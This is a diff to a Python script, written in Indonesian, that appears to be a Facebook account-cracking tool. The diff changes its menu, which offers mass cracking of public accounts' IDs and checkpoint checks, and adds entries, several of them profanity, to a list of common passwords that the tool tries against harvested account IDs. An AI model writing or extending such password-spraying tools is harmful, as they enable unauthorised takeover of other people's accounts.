@@ -155,7 +155,7 @@ def menu(my_name,my_id):
 	print(x+'['+h+'•'+x+'] \033[1;35mID Tumbal     : '+str(my_id))
 	print(x+'['+h+'•'+x+'] \033[93mTanggal Lahir : '+str(birth))
 	print(x+'['+h+'•'+x+'] \033[93mAlamat Ip     : '+str(sh['origin']))
-	io = '\x1b[1;92m[01] Crack Dari Pertemanan Publik\n\x1b[1;92m[02] Crack ID Dari Akun Publik (masal) \n\x1b[1;92m[03] Cek Hasil Crack\n\x1b[1;92m[04] Cek Opsi Checkpoint\n\033[31m[00] Keluar'
+	io = '\x1b[1;92m[01] Crack ID Pertemanan/Publik\n\x1b[1;92m[02] Crack ID Publik (Masal) \n\x1b[1;92m[03] Cek Hasil Crack\n\x1b[1;92m[04] Cek Opsi Checkpoint\n\033[31m[00] METU BANGSAT'
 	oi = nel(io, style='cyan')
 	cetak(nel(oi, title='PILIHAN MENU'))
 	jh = input(x+'['+p+'•'+x+'] Pilih : ')
@@ -504,7 +504,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['qwerty123','qwerty','iloveyou','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
+			pwv = ['indonesia','jancok','kontol','kontol123','qwerty123','qwerty','iloveyou','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
